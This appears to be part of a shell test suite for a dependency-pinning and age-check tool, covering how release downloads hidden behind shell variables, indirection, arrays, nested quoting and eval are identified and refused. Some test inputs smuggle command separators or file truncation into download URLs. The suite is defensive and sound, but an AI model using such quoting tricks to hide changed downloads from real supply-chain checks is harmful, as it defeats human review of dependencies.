CASE="AC21: a listed placeholder-looking path (build/\${var}/archive-keys.sha256) never exempts a different real path (build/\$OTHER/archive-keys.sha256), through the real inventory"
check python3 - "$chk" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
ac, inv = load("ac", sys.argv[1]), load("inv", sys.argv[2])
items = inv.inventory({"build/$OTHER/archive-keys.sha256": "x\n", "build/locks/archive-keys.sha256": "y\n"})
file_items = [i for i in items.values() if i.version == "(file)"]
assert len(file_items) == 2 and all(i.raw for i in file_items)
kept, ruled = ac.split_base_inputs(file_items, {"build/${var}/archive-keys.sha256", "build/locks/archive-keys.sha256"})
assert [i.raw for i in ruled] == ["build/locks/archive-keys.sha256"] and [i.raw for i in kept] == ["build/$OTHER/archive-keys.sha256"], (kept, ruled)
PY
CASE="AC21: the day-7 rerun applies the trusted list too: a held pull request that changes a listed file and a package that has since aged is re-run, an unlisted file keeps it held"
check python3 - "$here/../supply-chain/pin-audit.py" "$work/bi-ok.json" <<'PY'
import importlib.util, sys, os, datetime as dt
s = importlib.util.spec_from_file_location("pa", sys.argv[1]); pa = importlib.util.module_from_spec(s); s.loader.exec_module(pa)
age, inv = pa.age, pa.inv
age.DEFAULT_BASE_INPUTS = sys.argv[2]
class Net:
    def __init__(self, moved): self._m = moved
    def prs(self): return [{"number": 1, "title": "t", "run_id": 7, "moved": self._m}]
    def proofs(self, it, base=None, head="HEAD"): return [("2026-09-01T00:00:00Z", "pypi")] if it.kind == "package" else []
class Gh:
    def __init__(self): self.calls = []
    def run(self, *a, **k): self.calls.append(a)
now = dt.datetime(2026, 10, 14, 12, tzinfo=dt.timezone.utc)
for moved, want in ((["package:pypi/x@1.0.0", "tool:file:build/locks/archive-keys.sha256@(file)"], 1), (["package:pypi/x@1.0.0", "tool:file:build/locks/unlisted.sha256@(file)"], 0)):
    gh = Gh(); pa.rerun_held(gh, Net(moved), now)
    assert len([c for c in gh.calls if c[:2] == ("run", "rerun")]) == want, (moved, gh.calls)
PY

CASE="AC21: renaming a file between two paths that _hide() folds (build/\${var}/... listed, build/\$OTHER/... not) with the same content is a MOVED item (the path is part of the identity), so the unlisted one fails"
check python3 - "$chk" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
ac, inv = load("ac", sys.argv[1]), load("inv", sys.argv[2])
base = inv.inventory({"build/${var}/archive-keys.sha256": "same\n"})
head = inv.inventory({"build/$OTHER/archive-keys.sha256": "same\n"})
moved = inv.moved(base, head)
assert len(moved) == 1, moved
kept, ruled = ac.split_base_inputs(moved, {"build/${var}/archive-keys.sha256"})
assert len(kept) == 1 and not ruled
PY

CASE="two release downloads whose asset names differ only in the shell variable (or expression) they hold are two items, a changed variable is a moved item, and a concrete asset keeps its key (REQ-SUP-001-AC2: the check names every version that moved, a moved asset behind a variable included)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def dl(asset, tag="v1.2.3", where="bin/x.sh"):
    return {where: "curl -fsSL https://github.com/o/r/releases/download/%s/%s -o x\n" % (tag, asset)}
a, b = inv.inventory(dl("${A}.tgz")), inv.inventory(dl("${B}.tgz"))
assert len(a) == 1 and len(b) == 1 and set(a) != set(b), (sorted(a), sorted(b))
assert all("#step:" in k for k in list(a) + list(b)), (sorted(a), sorted(b))
assert set(a) == set(inv.inventory(dl("${A}.tgz"))), "the same spelling must give the same key"
assert len(inv.moved(a, b)) == 1, inv.moved(a, b)
# an expression, a braced variable and a bare one: each spelling is its own key
for x, y in (("${{ matrix.os }}.tgz", "${{ matrix.arch }}.tgz"), ("$OS.tgz", "$ARCH.tgz"), ("x_${OS}.tgz", "x_${ARCH}.tgz")):
    kx, ky = set(inv.inventory(dl(x))), set(inv.inventory(dl(y)))
    assert len(kx) == 1 and len(ky) == 1 and kx != ky, (x, y, sorted(kx), sorted(ky))
# a concrete asset is unchanged: no step tag, the key the inventory has always had
assert set(inv.inventory(dl("x.tgz"))) == {"tool:o/r/x.tgz@v1.2.3"}, sorted(inv.inventory(dl("x.tgz")))
# the same asset in a workflow step, the form every workflow takes
wf = lambda asset: {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://github.com/o/r/releases/download/v1.2.3/%s -o x\n" % asset}
assert set(inv.inventory(wf("${A}.tgz"))) != set(inv.inventory(wf("${B}.tgz")))
PY

CASE="release downloads behind variables or expressions, round 1 findings: two assets in one step are two items; an identical added occurrence is a moved item; whitespace inside an expression literal is part of the identity; a scanner assignment and a composite input default are part of the identity (REQ-SUP-001-AC2: the check names every version that moved)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = lambda a: "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/" + a + " -o x"
def wf(run, name="ci.yml"):
    body = "".join("          " + l + "\n" for l in run.split("\n"))
    return {".github/workflows/" + name: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n" + body}
assert len(inv.inventory(wf(dl("${A}.tgz") + "\n" + dl("${B}.tgz")))) == 2
base = wf(dl("${A}.tgz")); head = dict(base); head[".github/workflows/other.yml"] = wf(dl("${A}.tgz"))[".github/workflows/ci.yml"]
assert len(inv.moved(inv.inventory(base), inv.inventory(head))) == 1
e1, e2 = "${{ contains('a  b', 'a b') }}.tgz", "${{ contains('a b', 'a b') }}.tgz"
assert len(inv.moved(inv.inventory(wf(dl(e1))), inv.inventory(wf(dl(e2))))) == 1
sc = lambda v: {"bin/install-scanner.sh": "A=" + v + "\n" + dl("${A}") + "\n"}
assert len(inv.moved(inv.inventory(sc("x.tgz")), inv.inventory(sc("y.tgz")))) == 1
co = lambda v: {".github/actions/x/action.yml": "name: x\ninputs:\n  asset:\n    default: " + v + "\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: " + dl("${{ inputs.asset }}") + "\n"}
assert len(inv.moved(inv.inventory(co("x.tgz")), inv.inventory(co("y.tgz")))) == 1
PY

CASE="an item whose asset path is a placeholder has no age: judge_item and live_proofs refuse it even with an old proof (REQ-SUP-001-AC2, AC3)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
it = next(iter(inv.inventory({"bin/x.sh": "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/${A}.tgz -o x\n"}).values()))
ok = age.judge_item(it, [("2026-09-01T00:00:00Z", "pr-clock")], dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc))[0]
assert ok is False
assert age.live_proofs(it, ".") == []
PY

CASE="release downloads behind variables, round 2 findings: a later assignment, an indirect assignment (A=\$B) and the whitespace of a continued value are part of a script download's identity; a local composite call's with: value is part of the call's identity; an unrelated placeholder item keeps the key it had (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = 'curl -fsSL "https://github.com/o/r/releases/download/v1.2.3/${A}" -o x\n'
variants = [("A=x.tgz\n" + dl + "A=z.tgz\n", "A=y.tgz\n" + dl + "A=z.tgz\n"),
            ("B=x.tgz\nA=$B\n" + dl, "B=y.tgz\nA=$B\n" + dl),
            ('A=$(printf "%s" "x\\\n  .tgz" | tr " " "_")\n' + dl, 'A=$(printf "%s" "x\\\n   .tgz" | tr " " "_")\n' + dl)]
for script in ("bin/install-scanner.sh", "bin/x.sh"):
    for before, after in variants:
        assert inv.moved(inv.inventory({script: before}), inv.inventory({script: after})), (script, before)
action = "name: x\ninputs:\n  asset:\n    default: x.tgz\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl https://github.com/o/r/releases/download/v1.2.3/${{ inputs.asset }}\n"
tree = lambda a: {".github/actions/x/action.yml": action, ".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n        with:\n          asset: " + a + "\n"}
assert inv.moved(inv.inventory(tree("x.tgz")), inv.inventory(tree("y.tgz")))
q = lambda v: {".github/workflows/ci.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://github.com/o/r/releases/download/v1.2.3/tool-\"${" + v + "}\".tgz\n"}
assert inv.moved(inv.inventory(q("A")), inv.inventory(q("B"))), "a variable after a quote is part of the asset name"
assert set(inv.inventory({"bin/x.sh": "pip install black\n"})) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
wfk = {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install black\n"}
assert set(inv.inventory(wfk)) == {"package:pypi/black@(unpinned)#step:875cc02f02e6bc952fc1bca71c436657c10fc7e27058713fbd137cf0aed5eed8"}
PY

CASE="release downloads behind variables, round 3 findings: assignment ORDER, a name holding \$( ) with a space, composite input context kept apart from other items' keys, and a query variable that is not part of the name (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
dl = 'curl "' + url + '${A}.tgz" -o x\n'
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    assert inv.moved(inv.inventory({path: "B=x\nA=$B\nB=y\n" + dl}), inv.inventory({path: "B=y\nA=$B\nB=x\n" + dl})), path
wf = lambda asset: {".github/workflows/ci.yml": "on: push\nenv:\n  A: x\n  B: y\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl \"" + url + asset + "\" -o x\n"}
a, b = wf('$(printf %s "$A").tgz'), wf('$(printf %s "$B").tgz')
assert set(inv.inventory(a)) != set(inv.inventory(b))
it = next(iter(inv.inventory(b).values()))
assert "${" in it.path and "printf %s" in it.path, it.path
assert not age.judge_item(it, [("2026-09-01T00:00:00Z", "pr-clock")], dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc))[0]
comp = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: pip install black\n"}
assert set(inv.inventory(comp)) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
assert set(inv.inventory(wf("x.tgz?download=${A}"))) == {"tool:o/r/x.tgz@v1.2.3"}
PY

CASE="release downloads behind variables, round 3 (seat B): reordered assignments, the spacing of a continued value inside the download line itself, and the literals of an expression in a latest/download URL are each part of the identity (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
coll = lambda path, b, a: bool(inv.moved(inv.inventory({path: b}), inv.inventory({path: a})))
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for p in ("bin/x.sh", "bin/install-scanner.sh"):
    assert coll(p, "A=x\nA=y\n" + dl + "A=z\n", "A=y\nA=x\n" + dl + "A=z\n"), p
    cont = lambda n: 'curl "https://github.com/o/r/releases/download/v1.2.3/${A:-$(printf "%s" "x\\\n' + " " * n + '.tgz" | tr " " "_")}"\n'
    assert coll(p, cont(2), cont(3)), p
wf = lambda run: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"
latest = "curl https://github.com/o/r/releases/latest/download/${{ contains('a  b', 'a b') }}.tgz"
assert coll(".github/workflows/ci.yml", wf(latest), wf(latest.replace("'a  b'", "'a b'")))
PY

CASE="release downloads behind variables, round 4 findings: a variable after a quote that closed the URL, a name with a command substitution or backticks or a positional parameter, and assignments in the forms A=x B=old, export A=x B=old and declare -r A= are each part of the identity and refused (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
wf = lambda run: {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"}
b1a, b1b = wf('curl "' + url + 'tool-"${A}.tgz'), wf('curl "' + url + 'tool-"${B}.tgz')
assert inv.moved(inv.inventory(b1a), inv.inventory(b1b))
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
for name in ("$(uname -m).tgz", "`uname -m`.tgz", "$1.tgz", "$((1+1)).tgz"):
    it = next(iter(inv.inventory(wf("curl " + url + "tool-" + name)).values()))
    assert it.step, (name, it.key)
    assert not age.judge_item(it, [("2026-09-01T00:00:00Z", "pr-clock")], now)[0], name
    assert age.live_proofs(it, ".") == [], name
dl = "curl " + url + "${B}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre in ("A=x B=", "export A=x B=", "declare -r B=", "export UNUSED=fixed B="):
        assert inv.moved(inv.inventory({path: pre + "old\n" + dl}), inv.inventory({path: pre + "new\n" + dl})), (path, pre)
PY

CASE="release downloads behind variables, round 5 findings: a quoted exported assignment (export \"A=\$B\") is part of the identity, and a quote inside an earlier command substitution does not change a concrete asset's key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for decl in ('export "A=$%s"', "export 'A=$%s'", 'declare -x "A=$%s"', 'readonly "A=$%s"'):
        b = {path: "B=x.tgz\nC=y.tgz\n" + decl % "B" + "\n" + dl}; a = {path: "B=x.tgz\nC=y.tgz\n" + decl % "C" + "\n" + dl}
        assert inv.moved(inv.inventory(b), inv.inventory(a)), (path, decl)
for pre in ("x=$(printf '%s' ok); ", 'x=$(printf "%s" ok); ', "x=$(echo 'a)b'); ", 'x=$(echo "$(printf \'q\')"); ', "x=`echo 'a'`; "):
    items = []
    inv._step({"run": pre + 'curl https://github.com/o/r/releases/download/v1.2.3/x.tgz -o "$OUT"'}, items, {})
    assert {it.key for it in items} == {"tool:o/r/x.tgz@v1.2.3"}, (pre, [it.key for it in items])
PY

CASE="release downloads behind variables, round 6 findings: a variable read only inside \$(( )), a concrete download inside a command substitution, and the caller's env of a local composite call are part of the identity or leave the concrete key alone (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda n: {path: "N=" + str(n) + "\ncurl " + url + "tool-$((N)).tgz\n"}
    assert inv.moved(inv.inventory(sc(1)), inv.inventory(sc(2))), path
for run in ('body=$(curl ' + url + 'x.tgz -o "$OUT")', 'a=`curl ' + url + 'x.tgz -o "$OUT"`', 'b="$(curl ' + url + 'x.tgz -o x)"'):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz"}]}})
def tree(asset):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x", "env": {"ASSET": asset}}]}}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
assert inv.moved(inv.inventory(tree("old")), inv.inventory(tree("new")))
PY

CASE="release downloads behind variables, round 7 findings: an array element write and an indirect or indexed expansion are part of the identity, the inherited workflow env and matrix are part of a local action call's identity, a concrete download in double-quoted backticks or in a quoted URL followed by arguments keeps its concrete key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre, ref in (("A[0]=%s", "${A}"), ("ASSETS[0]=%s", "${ASSETS[0]}"), ("ASSETS[1]=%s", "${ASSETS[1]}"), ("SEL=%s", "${!P}")):
        extra = "P=SEL\n" if "!P" in ref else ""
        sc = lambda v: {path: extra + pre % v + "\ncurl " + url + ref + ".tgz -o x\n"}
        assert inv.moved(inv.inventory(sc("old")), inv.inventory(sc("new"))), (path, pre, ref)
    idx = lambda i: {path: "ASSETS[0]=a\nASSETS[1]=b\nIDX=" + str(i) + "\ncurl " + url + "${ASSETS[IDX]}.tgz\n"}
    assert inv.moved(inv.inventory(idx(0)), inv.inventory(idx(1))), path
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz -o x"}]}})
def tree(**kw):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x"}]}}}
    if "wenv" in kw: wf["env"] = {"ASSET": kw["wenv"]}
    if "jenv" in kw: wf["jobs"]["j"]["env"] = {"ASSET": kw["jenv"]}
    if "matrix" in kw: wf["jobs"]["j"]["strategy"] = {"matrix": {"asset": [kw["matrix"]]}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
for k in ("wenv", "jenv", "matrix"):
    assert inv.moved(inv.inventory(tree(**{k: "old"})), inv.inventory(tree(**{k: "new"}))), k
for run in ('body="`curl ' + url + 'x.tgz -o x`"', 'curl "' + url + 'x.tgz" -o "$OUT"', "curl '" + url + "x.tgz' -o \"$OUT\""):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, (run, sorted(inv.inventory({"bin/x.sh": run + "\n"})))
PY

CASE="release downloads behind variables, round 7 findings (seat A): a name written by printf -v or read, a name written to GITHUB_ENV by an earlier step, a concrete download inside a quoted program string, and a plain local action call under on: push keeps its key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda v: {path: "B=old C=new\nprintf -v A %s \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(sc("B"), sc("C")), ("printf -v", path)
    rd = lambda v: {path: "B=old\nC=new\nread -r A <<< \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(rd("B"), rd("C")), ("read", path)
def wf(v):
    steps = [{"run": "echo ASSET=$" + v + " >> \"$GITHUB_ENV\""}, {"run": "curl " + url + "${ASSET}.tgz"}]
    return {".github/workflows/x.yml": json.dumps({"on": "push", "env": {"B": "old", "C": "new"}, "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": steps}}})}
assert mv(wf("B"), wf("C")), "GITHUB_ENV"
for run in ("bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", 'bash -c "curl ' + url + 'x.tgz -o $OUT"'):
    its = list(inv.inventory({"bin/x.sh": run + "\n"}).values())     # a quoted program string that holds a variable is not parsed: its URL is unresolved (refused), never read as a concrete key
    assert len(its) == 1 and "$" in its[0].path, (run, [i.key for i in its])
plain = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo hi\n",
         ".github/workflows/x.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n"}
assert all(k.endswith("@(local)") for k in inv.inventory(plain) if k.startswith("action:local")), sorted(inv.inventory(plain))
PY

CASE="release downloads behind variables, round 7 findings (seat B): a quoted parenthesis, an indirection through an assignment and a multiline array cannot hide a changed asset because an unresolved asset is identified by its whole file (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
def wf(v):
    return {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          body=$(curl \"" + url + "tool)\"${" + v + "}.tgz)\n"}
assert mv(wf("A"), wf("B")), "quoted parenthesis"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    ind = lambda v: {path: "SEL=" + v + "\nP=SEL\nA=${!P}\ncurl " + url + "${A}.tgz\n"}
    assert mv(ind("old"), ind("new")), ("indirect", path)
    arr = lambda v: {path: "A=(\n  " + v + "\n)\ncurl " + url + "${A[0]}.tgz\n"}
    assert mv(arr("old"), arr("new")), ("array", path)
    # an edit anywhere in a file that holds an unresolved download is a moved item; a file with only concrete downloads is unchanged by an unrelated edit
    conc = lambda c: {path: "# " + c + "\ncurl " + url + "x.tgz -o x\n"}
    assert not mv(conc("a"), conc("b")), ("concrete", path)
    assert set(inv.inventory(conc("a"))) == {"tool:o/r/x.tgz@v1.2.3"}
PY

CASE="release downloads behind variables, round 8 findings (same class, nested quoting): a release URL inside a quoted program string that holds a variable, a substitution or a command separator is unresolved (whole-file identity, refused by the age judge), a variable after a quoted parenthesis is part of the name, and a plain quoted download keeps its key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
def wf(run): return {".github/workflows/p.yml": json.dumps({"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new", "OUT": "o"}, "steps": [{"run": run}]}}})}
# nested program strings holding $, a substitution or a separator: unresolved and refused
for run in ("bash -c 'curl \"" + url + "tool;${A}.tgz\"'", "bash -c \"curl " + url + "x.tgz;:>$OUT\"", "bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", "eval \"curl " + url + "x.tgz $EXTRA\""):
    its = list(inv.inventory(wf(run)).values())
    assert len(its) == 1 and ("$" in its[0].path or "`" in its[0].path), (run, [i.key for i in its])
    assert not age.judge_item(its[0], [("2026-09-01T00:00:00Z", "github-release")], now)[0], run
# a variable after a quoted parenthesis changes the name
a = {"bin/x.sh": "curl '" + url + "tool)'${A}.tgz -o x\n"}; b = {"bin/x.sh": "curl '" + url + "tool)'${B}.tgz -o x\n"}
assert inv.moved(inv.inventory(a), inv.inventory(b))
# a plain quoted URL with an argument after it, and a program string with nothing dynamic, keep their keys
for run in ("curl \"" + url + "x.tgz\" -o \"$OUT\"", "bash -c 'curl " + url + "x.tgz -o x'"):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
PY

CASE="release downloads behind variables, round 9 finding (both seats, same class): a quote segment that merely BEGINS with the release URL inside a quoted program string (eval 'curl \"''https://.../tool;\${A}.tgz''\"') is not an ordinary URL operand: the name is unresolved (whole-file identity, refused by the age judge) and a variable edit is a moved item; a word that is the URL itself keeps its concrete key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
def tree(var, run):
    w = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new"}, "steps": [{"run": run.replace("VAR", var)}]}}}
    return {".github/workflows/p.yml": json.dumps(w)}
for run in ("eval 'curl \"''" + url + "tool;${VAR}.tgz''\"'",
            "sh -c 'curl \"'\"'" + url + "tool-${VAR}.tgz'\"'\"'",
            "bash -c \"curl '\"'\"'" + url + "tool;${VAR}.tgz'\"'\"'\""):
    a, b = inv.inventory(tree("A", run)), inv.inventory(tree("B", run))
    assert inv.moved(a, b), run
    it = next(iter(b.values()))
    assert not age.judge_item(it, [("2026-09-01T00:00:00Z", "github-release")], dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc))[0], run
ok = tree("A", 'curl "' + url + 'x.tgz?download=${A}"')
assert set(inv.inventory(ok)) == {"tool:o/r/x.tgz@v1.2.3"}, sorted(inv.inventory(ok))
PY

echo "pin-age-check: $pass passed, $failn failed"
test "$failn" -eq 0
